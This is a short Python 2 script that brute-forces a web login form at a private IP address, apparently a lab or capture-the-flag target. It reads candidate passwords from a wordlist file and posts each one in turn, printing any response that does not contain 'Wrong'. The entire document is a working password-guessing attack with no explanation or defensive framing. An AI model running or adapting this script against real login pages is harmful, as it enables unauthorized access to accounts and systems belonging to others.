#coding:utf-8
import requests
with open("pass.dic",'r') as f:
    for x in f.readlines():
        url="http://172.16.5.104/"
        header={
    "Content-Type":"application/x-www-form-urlencode"
}
        data={
            "pass":x,
            "submit":"%E6%8F%90%E4%BA%A4"
        }
        try:
            res=requests.post(url,data=data,timeout=5)
        # print res.content
            if "Wrong" not in res.content:
                print res.content
        except Exception, e:
            print x